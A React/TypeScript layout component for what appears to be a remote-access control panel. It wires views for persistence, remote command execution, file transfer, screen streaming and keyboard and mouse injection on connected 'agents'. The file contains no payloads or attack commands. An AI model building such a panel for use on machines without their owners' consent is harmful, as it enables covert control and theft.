import React, { useState, useEffect } from 'react';
import { Outlet, useLocation, useNavigate } from 'react-router-dom';
import { useSocketIO } from '@/hooks/useSocketIO';
import MainNavigation from '@/components/navigation/MainNavigation';
import StreamingView from '@/components/streaming/StreamingView';
import SecurityView from '@/components/security/SecurityView';
import DashboardView from '@/components/dashboard/DashboardView';
import MonitoringView from '@/components/monitoring/MonitoringView';
import PersistenceView from '@/components/persistence/PersistenceView';
import FileTransferView from '@/components/filetransfer/FileTransferView';
import AgentControlView from '@/components/agent/AgentControlView';
import SettingsView from '@/components/settings/SettingsView';

const MainLayout: React.FC = () => {
  const location = useLocation();
  const navigate = useNavigate();
  const [activeSection, setActiveSection] = useState('dashboard');
  const [selectedAgent, setSelectedAgent] = useState<string | null>(null);

  // Socket.IO connection for real-time updates
  const {
    socket,
    isConnected,
    agents,
    commandResults,
    configStatus,
    fileTransfers,
    webrtcStats,
    qualityData,
    productionReadiness,
    executeCommand,
    getSystemHealth,
    listProcesses,
    refreshDashboard,
    uploadFile,
    downloadFile,
    startWebRTCStreaming,
    stopWebRTCStreaming,
    getWebRTCStats,
    setWebRTCQuality,
    getProductionReadiness,
    sendKeyPress,
    sendMouseMove,
    sendMouseClick,
    changePassword,
    getConfigStatus
  } = useSocketIO();

  // Update active section based on current route
  useEffect(() => {
    const path = location.pathname.split('/')[1] || 'dashboard';
    setActiveSection(path);
  }, [location.pathname]);

  // Get config status on component mount
  useEffect(() => {
    if (isConnected) {
      getConfigStatus();
      getProductionReadiness();
    }
  }, [isConnected, getConfigStatus, getProductionReadiness]);

  const handleSectionChange = (section: string) => {
    setActiveSection(section);
    navigate(`/${section === 'dashboard' ? '' : section}`);
  };

  const renderCurrentView = () => {
    const commonProps = {
      agents,
      selectedAgent,
      onAgentSelect: setSelectedAgent,
      isConnected,
      configStatus,
      webrtcStats,
      qualityData,
      commandResults,
      fileTransfers,
      executeCommand,
      getSystemHealth,
      listProcesses,
      refreshDashboard,
      uploadFile,
      downloadFile,
      startWebRTCStreaming,
      stopWebRTCStreaming,
      getWebRTCStats,
      setWebRTCQuality,
      sendKeyPress,
      sendMouseMove,
      sendMouseClick,
      changePassword
    };

    switch (activeSection) {
      case 'dashboard':
        return <DashboardView {...commonProps} />;
      case 'streaming':
        return <StreamingView {...commonProps} />;
      case 'security':
        return <SecurityView {...commonProps} />;
      case 'monitoring':
        return <MonitoringView {...commonProps} />;
      case 'persistence':
        return <PersistenceView {...commonProps} />;
      case 'filetransfer':
        return <FileTransferView {...commonProps} />;
      case 'agents':
        return <AgentControlView {...commonProps} />;
      case 'settings':
        return <SettingsView {...commonProps} />;
      default:
        return <DashboardView {...commonProps} />;
    }
  };

  return (
    <div className="flex h-screen bg-background">
      {/* Navigation Sidebar */}
      <MainNavigation
        activeSection={activeSection}
        onSectionChange={handleSectionChange}
        agents={agents}
        isConnected={isConnected}
        configStatus={configStatus}
      />

      {/* Main Content Area */}
      <div className="flex-1 flex flex-col overflow-hidden">
        {renderCurrentView()}
      </div>
    </div>
  );
};

export default MainLayout;